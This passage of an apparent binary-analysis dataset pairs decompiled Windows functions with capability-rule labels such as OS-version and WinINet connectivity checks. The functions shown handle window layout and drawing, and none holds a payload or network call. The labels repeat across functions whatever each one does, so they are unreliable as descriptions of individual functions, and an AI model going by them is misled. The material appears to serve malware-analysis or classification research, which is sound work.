-0x10) = in_EAX;\n        }\n    }\ncode_r0x0045040f:\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.0044fa04();\n        if (iVar2 != 0) {\n            iVar2 = arg_8h;\n            fcn.0044fa04();\n            fcn.0045034c(iVar2);\n        }\n    }\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.0044fa2c();\n        if (iVar2 != 0) {\n            fcn.0044fa2c();\n            fcn.0045034c(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 586
    },
    "00450460": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00450460(uint *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *arg_8h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    var_10h = 0;\n    *param_1 = 0;\n    iVar1 = fcn.004502c0();\n    if ((iVar1 == 0) || (*(in_EAX + 0x14) != *(iVar1 + 0x94))) {\n        iVar2 = fcn.0044fa2c();\n        if ((iVar2 != 0) && (iVar1 == 0)) {\n            fcn.0044fa2c();\n            fcn.0045034c(arg_8h);\n        }\n    }\n    else {\n        var_10h = fcn.0044fc7c();\n        if (var_10h != 0) {\n            *param_1 = 1;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 260
    },
    "004504e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004504e8(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.00404da0();\n    (**(**(arg_8h + -4) + 0xc))();\n    if (0 < in_ECX) {\n        fcn.004054ec();\n        (**(**(arg_8h + -4) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00450530": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00450530(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint uVar6;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uchar var_26h;\n    int32_t var_25h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack92 = 0x450873;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack96;\n    var_ch = in_EAX;\n    var_4h = param_2;\n    fcn.00450e34();\n    var_25h._0_1_ = *(var_ch + 0x1d);\n    fcn.0044fc0c();\n    uVar6 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    (**(*var_4h + 0xc))();\n    if (var_1ch == 0x40000) {\n        *(var_ch + 0x1d) = 0;\n        var_26h = 0;\n    }\n    else if (var_ch[0x1c] == var_1ch) {\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n    }\n    else {\n        var_40h = var_ch[0x1c];\n        var_3ch._0_1_ = 0;\n        var_38h = var_1ch;\n        var_34h._0_1_ = 0;\n        arg_ch = &var_40h;\n        uVar4 = 1;\n        fcn.00406a50();\n        fcn.0040c5e8(uVar4, arg_ch);\n        fcn.004047cc();\n    }\n    (**(*var_4h + 0xc))();\n    if (-1 < var_20h + -1) {\n        var_30h = var_20h;\n        var_1ch = 0;\n        do {\n            fcn.004504e8(&stack0xfffffffc);\n            if (var_8h != 0) {\n                fcn.00404154();\n                if (var_10h != 0) {\n                    fcn.004454cc();\n                    uVar6 = 0;\n                    fcn.004463b8(0);\n                }\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    (**(*var_4h + 0xc))();\n    if (*(var_ch + 0x1d) != '\\0') {\n        (**(*var_ch + 0x28))();\n        iVar2 = fcn.00451f24();\n        var_ch[0x1a] = iVar2;\n    }\n    var_18h = 0;\n    iVar2 = 0;\ncode_r0x004506ce:\n    do {\n        (**(*var_4h + 0xc))();\n        if (var_14h == *0x4916fc) {\n            *in_FS_OFFSET = uVar6;\n            *(var_ch + 0x1d) = var_25h;\n            if (var_ch[0x19] == 0) {\n                iVar2 = fcn.0044f3ac();\n                var_ch[0x19] = iVar2;\n            }\n            fcn.0044fc10();\n            return;\n        }\n        iVar3 = fcn.0044f3ac();\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n        if (*(var_ch + 0x1d) != '\\0') {\n            (**(*var_ch + 0x28))();\n            uVar4 = fcn.00451f24();\n            *(iVar3 + 0x20) = uVar4;\n        }\n        fcn.004504e8(&stack0xfffffffc);\n        if (var_8h != 0) {\n            cVar1 = fcn.0044f6f8();\n            if (cVar1 == '\\0') {\n                fcn.00403f58();\n                goto code_r0x004506ce;\n            }\n        }\n        if (var_14h == 0) {\n            var_ch[0x19] = iVar3;\n        }\n        else if (var_14h == var_18h) {\n            iVar5 = iVar2;\n            if ((*(iVar2 + 0x18) != 0) && (*(iVar2 + 4) == 0)) {\n                iVar5 = *(iVar2 + 0x18);\n                var_2ch = iVar2;\n                fcn.00403f58();\n            }\n            *(iVar5 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = iVar5;\n            *(iVar3 + 0x14) = *(iVar5 + 0x14);\n        }\n        else if (var_18h < var_14h) {\n            *(iVar2 + 8) = iVar3;\n            *(iVar3 + 0x14) = iVar2;\n        }\n        else if (var_14h < var_18h) {\n            unique0x10000202 = iVar2;\n            if (0 < var_18h - var_14h) {\n                var_1ch = 1;\n                var_30h = var_18h - var_14h;\n                do {\n                    unique0x00007a00 = *(stack0xffffffd8 + 0x14);\n                    var_1ch = var_1ch + 1;\n                    var_30h = var_30h + -1;\n                } while (var_30h != 0);\n            }\n            *(stack0xffffffd8 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = stack0xffffffd8;\n            *(iVar3 + 0x14) = *(stack0xffffffd8 + 0x14);\n        }\n        var_18h = var_14h;\n        iVar2 = iVar3;\n    } while( true );\n}\n",
        "token_count": 1571
    },
    "00450b50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00450b50(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x450b69;\n    var_4h = fcn.00421624();\n    uStack52 = 0x450c74;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x450b85;\n    puStack48 = &stack0xfffffffc;\n    fcn.00443e20();\n    puStack60 = 0x450b8d;\n    fcn.00421928();\n    uStack64 = 0x450c57;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x450ba5;\n    puStack60 = &stack0xfffffffc;\n    fcn.00421d14();\n    uStack76 = 0x450c3a;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar1 = fcn.00449558();\n    if (-1 < iVar1 + -1) {\n        var_8h = 0;\n        var_ch = iVar1;\n        do {\n            iVar1 = fcn.0044951c();\n            if ((*(iVar1 + 0x57) != '\\0') && (*(iVar1 + 0x94) == in_EAX[5])) {\n                fcn.00444ebc();\n                (***in_EAX)();\n                (**(*in_EAX + 4))();\n                (**(*in_EAX + 0x20))(&fcn.00450b50::var_1ch);\n            }\n            var_8h = var_8h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x450c41;\n    uStack76 = 0x450c39;\n    fcn.00421d14();\n    return;\n}\n",
        "token_count": 574
    },
    "00450c84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00450c84(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint *arg_8h_00;\n    int32_t var_1ch;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = fcn.0044bc10();\n    if (((in_ECX == 0) || (*(in_ECX + 0x90) == '\\0')) || (iVar2 < 2)) {\n        uVar3 = fcn.00444f5c();\n        arg_8h_00 = &var_1ch;\n        fcn.00444f18();\n        fcn.00413a94(arg_8h_00, uVar3);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n        if (0 < iVar2) {\n            if (arg_ch == '\\x01') {\n                arg_8h[3] = arg_8h[3] / 2;\n            }\n            else if (arg_ch == '\\x02') {\n                iVar2 = arg_8h[3] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[3] & 1U) != 0);\n                }\n                arg_8h[1] = iVar2;\n            }\n            else if (arg_ch == '\\x03') {\n                arg_8h[2] = arg_8h[2] / 2;\n            }\n            else if (arg_ch == '\\x04') {\n                iVar2 = arg_8h[2] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[2] & 1U) != 0);\n                }\n                *arg_8h = iVar2;\n            }\n        }\n    }\n    else {\n        var_4h = *(in_ECX + 0x40);\n        var_8h = *(in_ECX + 0x44);\n        uVar4 = *(in_ECX + 0x48);\n        var_ch = *(in_ECX + 0x4c);\n        if (arg_ch - 3U < 2) {\n            uVar1 = uVar4 & 1;\n            uVar4 = uVar4 >> 1;\n            if (uVar4 < 0) {\n                uVar4 = uVar4 + (uVar1 != 0);\n            }\n        }\n        else if (arg_ch - 1U < 2) {\n            var_ch = *(in_ECX + 0x4c) >> 1;\n            if (var_ch < 0) {\n                var_ch = var_ch + ((*(in_ECX + 0x4c) & 1) != 0);\n            }\n        }\n        if (arg_ch == '\\x02') {\n            var_8h = var_8h + var_ch;\n        }\n        else if (arg_ch == '\\x04') {\n            var_4h = var_4h + uVar4;\n        }\n        fcn.00413abc(&var_1ch, var_ch);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n    }\n    uVar3 = fcn.0044d1c8(0, arg_8h, 2);\n    sub.user32.dll_MapWindowPoints(uVar3);\n    return;\n}\n",
        "token_count": 892
    },
    "00450ed0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450ed0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY52;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack40 = 0x451161;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar2 = &stack0xfffffffc;\n    if (param_2 == 0) {\n        fcn.00406a50();\n        uStackY52 = 0x450f10;\n        fcn.00406a50(&fcn.00450ed0::var_4h);\n        fcn.0040506c();\n        fcn.0040c5ac();\n        fcn.004047cc();\n        puVar2 = puStack36;\n    }\n    puStack36 = puVar2;\n    if (*(param_2 + 4) == 0) {\n        fcn.00406a50();\n        uStackY52 = 0x450f51;\n        fcn.00406a50(&fcn.00450ed0::var_ch);\n        fcn.0040506c();\n        fcn.0040c5ac();\n        fcn.004047cc();\n    }\n    iVar3 = fcn.0044f3d0();\n    if (iVar3 == 1) {\n        iVar3 = *(in_EAX + 100);\n        *(iVar3 + 8) = 0;\n        *(iVar3 + 0x10) = 0;\n    }\n    else if (iVar3 == 2) {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            iVar3 = *(param_2 + 0xc);\n        }\n        if (*(iVar3 + 4) == 0) {\n            if (*(param_2 + 0x14) == *(in_EAX + 100)) {\n                fcn.0044f964();\n                uVar4 = fcn.0044f928();\n                *(in_EAX + 0x68) = uVar4;\n                fcn.00403f58();\n                *(in_EAX + 100) = iVar3;\n                *(iVar3 + 0xc) = 0;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0x14) = 0;\n                fcn.004517b8();\n            }\n            else {\n                iVar1 = *(iVar3 + 8);\n                if (iVar1 == 0) {\n                    *(*(iVar3 + 0x14) + 8) = 0;\n                    fcn.00403f58();\n                }\n                else {\n                    *(iVar1 + 0x18) = *(*(param_2 + 0x14) + 0x18);\n                    if (*(*(iVar3 + 8) + 0x18) == 0) {\n                        *(*(*(param_2 + 0x14) + 0x14) + 8) = iVar1;\n                    }\n                    else {\n                        *(*(*(iVar3 + 8) + 0x18) + 0xc) = iVar1;\n                    }\n                    iVar3 = *(iVar3 + 8);\n                    *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                    iVar1 = *(iVar3 + 0xc);\n                    while (iVar1 != 0) {\n                        iVar3 = *(iVar3 + 0xc);\n                        *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                        iVar1 = *(iVar3 + 0xc);\n                    }\n                    *(iVar3 + 0xc) = *(*(param_2 + 0x14) + 0xc);\n                    if (*(iVar3 + 0xc) != 0) {\n                        *(*(iVar3 + 0xc) + 0x18) = iVar3;\n                    }\n                    uStackY52 = 0x4517e0;\n                    fcn.0044fce4();\n                    fcn.00403f58();\n                    fcn.00403f58();\n                }\n            }\n        }\n        else {\n            iVar1 = *(param_2 + 0x14);\n            if (*(in_EAX + 100) == iVar1) {\n                *(*(in_EAX + 100) + 8) = iVar3;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0xc) = 0;\n                fcn.0044f488();\n                fcn.0044f950();\n                fcn.0044f7ac();\n            }\n            else {\n                *(iVar1 + 0x10) = 0;\n                *(iVar1 + 4) = *(iVar3 + 4);\n                *(iVar1 + 8) = 0;\n                fcn.00403f58();\n            }\n            uStackY52 = 0x4517e0;\n            fcn.0044fce4();\n        }\n    }\n    else {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            *(*(param_2 + 0x14) + 8) = *(param_2 + 0xc);\n            *(*(param_2 + 0xc) + 0x18) = 0;\n            fcn.0044f7ac();\n        }\n        else {\n            *(iVar3 + 0xc) = *(param_2 + 0xc);\n            if (*(param_2 + 0xc) != 0) {\n                *(*(param_2 + 0xc) + 0x18) = iVar3;\n            }\n            fcn.0044f928();\n            fcn.0044f964();\n            fcn.0044f7ac();\n        }\n        uStackY52 = 0x4517e0;\n        fcn.0044fce4();\n    }\n    fcn.00403f58();\n    *in_FS_OFFSET = uStackY52;\n    uStack44 = 0x451168;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 1472
    },
    "00451314": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451314(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x451414;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (((in_EAX == *(*(arg_8h + -8) + 100)) || (*(in_EAX + 8) != 0)) ||\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 4) != 0)) {\n        (**(**(arg_8h + -4) + 0x10))();\n        (**(**(arg_8h + -4) + 0x10))();\n        if (*(*(arg_8h + -8) + 0x74) != '\\0') {\n            (**(**(arg_8h + -8) + 0x28))();\n            fcn.00451f54();\n        }\n        (**(**(arg_8h + -4) + 0x10))();\n        arg_8h_00 = arg_8h;\n        fcn.0044f6b4();\n        fcn.00451298(arg_8h_00);\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    if (*(in_EAX + 8) != 0) {\n        fcn.00451314(arg_8h);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.00451314(arg_8h);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x45141b;\n    uStack32 = 0x451413;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 469
    },
    "00451424": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451424(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x4515cb;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x451458;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45146b;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x451481;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45148d;\n    piVar1 = fcn.00403f28();\n    uStack56 = 0x451544;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    iVar2 = fcn.0044bb7c();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0044bb90();\n            if ((*(iVar3 + 0x57) == '\\0') && (*(iVar3 + 8) != 0)) {\n                (**(*piVar1 + 0x38))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = (**(*piVar1 + 0x14))();\n    (**(*param_2 + 0x10))();\n    if (-1 < iVar2 + -1) {\n        do {\n            arg_8h = &stack0xfffffffc;\n            (**(*piVar1 + 0xc))();\n            fcn.00451298(arg_8h);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x45154b;\n    uStack56 = 0x451543;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 584
    },
    "0045173c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045173c(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0045250c();\n    fcn.00451804();\n    sub.user32.dll_ReleaseDC(*(in_EAX + 0x5c), *(in_EAX + 0x58));\n    if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n        fcn.0044f950();\n    }\n    else {\n        fcn.0044f950();\n    }\n    fcn.00451660();\n    fcn.0044fce4(0x4517e0);\n    *(in_EAX + 0x60) = 0;\n    return;\n}\n",
        "token_count": 166
    },
    "004517b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004517b8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x6c) == 0) {\n        iVar1 = fcn.0044bb7c();\n        if (0 < iVar1) {\n            fcn.0044fce4(0x4517e0);\n        }\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "00451804": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00451804(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n            iVar1 = fcn.0044f4d0();\n            iVar2 = *(in_EAX + 0xc) >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar2 = *(in_EAX + 0x54) - iVar2;\n            iVar3 = fcn.0044f554(iVar1, iVar2);\n            iVar3 = iVar3 + iVar1;\n            iVar4 = iVar2 + *(in_EAX + 0xc);\n        }\n        else {\n            iVar1 = *(in_EAX + 0xc) >> 1;\n            if (iVar1 < 0) {\n                iVar1 = iVar1 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar1 = *(in_EAX + 0x50) - iVar1;\n            iVar2 = fcn.0044f4d0(iVar1);\n            iVar3 = iVar1 + *(in_EAX + 0xc);\n            iVar4 = fcn.0044f554(iVar1, iVar2, iVar3);\n            iVar4 = iVar4 + iVar2;\n        }\n        iVar4 = fcn.00421508(iVar1, iVar2, iVar3, iVar4);\n        iVar3 = *(in_EAX + 0x58);\n        uVar5 = sub.gdi32.dll_SelectObject(iVar3, iVar4);\n        sub.gdi32.dll_PatBlt(*(in_EAX + 0x58), iVar3, iVar4, iVar1 - iVar3, iVar2 - iVar4, 0x5a0049);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 0x58), uVar5);\n    }\n    return;\n}\n",
        "token_count": 506
    },
    "004518f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004518f0(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((in_EAX != *(arg_8h + -4)) && (*(*(in_EAX + 0x14) + 0x10) == *(*(*(arg_8h + -4) + 0x14) + 0x10))) {\n        iVar1 = fcn.0044f928();\n        iVar2 = fcn.0044f928();\n        if ((iVar2 < iVar1) && ((*(in_EAX + 4) == 0 || ((*(in_EAX + 4) != 0 && (*(*(in_EAX + 4) + 0x57) != '\\0')))))) {\n            iVar1 = *(arg_8h + -8);\n            iVar2 = fcn.0044f928();\n            if (iVar1 < iVar2) {\n                iVar2 = iVar1;\n            }\n            *(arg_8h + -8) = iVar2;\n        }\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.004518f0(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.004518f0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "00451acc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451acc(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x14) != 0) && (*(in_EAX + 0x14) != *(*(arg_8h + -4) + 100))) {\n        iVar2 = fcn.0044f3e4();\n        if (iVar2 == 1) {\n            fcn.00451acc(arg_8h);\n        }\n    }\n    iVar2 = fcn.0044f3e4();\n    if ((iVar2 == 1) || (*(in_EAX + 0x24) == 0)) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n        iVar2 = *(*(arg_8h + -4) + 0x18) + *(*(arg_8h + -4) + 0xc) + 0xe;\n        iVar3 = fcn.0044fa10();\n        if (iVar3 == 0) {\n            iVar3 = fcn.0044fa04();\n            if (iVar3 != 0) {\n                fcn.0044fa04();\n                iVar3 = fcn.0044f928();\n                if (iVar3 - *(in_EAX + 0x24) < iVar2) {\n                    bVar1 = true;\n                }\n                else {\n                    fcn.0044f440();\n                    fcn.0044f950();\n                    fcn.0044fa04();\n                    fcn.0044f9a4();\n                }\n            }\n        }\n        else {\n            fcn.0044fa10();\n            iVar3 = fcn.0044f928();\n            iVar4 = fcn.0044f440();\n            if ((iVar3 - iVar4) - *(in_EAX + 0x24) < iVar2) {\n                bVar1 = true;\n            }\n            else {\n                fcn.0044f928();\n                fcn.0044f950();\n                fcn.0044f928();\n                fcn.0044f950();\n                fcn.0044fa10();\n                fcn.0044f9a4();\n            }\n        }\n    }\n    if (bVar1) {\n        fcn.0044f60c();\n    }\n    fcn.0044fce4(0x4517e0, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 571
    },
    "00451ff8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00451ff8(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint8_t in_CL;\n    char in_DL;\n    uint var_2ch;\n    uint var_24h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (in_DL == '\\0') {\n        if ((in_CL & 0x40) == 0) {\n            fcn.00413a6c();\n            iVar2 = fcn.00450460();\n            if (iVar2 != 0) {\n                if (var_8h == 0x12) {\n                    fcn.00413a6c();\n                    fcn.004516dc();\n                }\n                else if (var_8h == 2) {\n                    uVar3 = fcn.0044d1c8(0x203, 0x203, 0);\n                    iVar4 = sub.user32.dll_PeekMessageA(&var_24h, uVar3);\n                    if (iVar4 == 0) {\n                        cVar1 = fcn.004040e4();\n                        if (cVar1 != '\\0') {\n                            (**(**(iVar2 + 4) + 0xd4))();\n                        }\n                    }\n                    if ((*(*(iVar2 + 4) + 0x8f) == '\\x01') && (*(*(iVar2 + 4) + 0x5d) == '\\x01')) {\n                        fcn.00445cf4();\n                    }\n                    *arg_8h = 1;\n                }\n            }\n        }\n        else {\n            fcn.00413a6c();\n            iVar2 = fcn.00450460();\n            if (((iVar2 != 0) && (*(iVar2 + 4) != 0)) && (var_8h == 2)) {\n                fcn.00443aa0();\n                fcn.004463b8(1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 481
    },
    "0045211c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
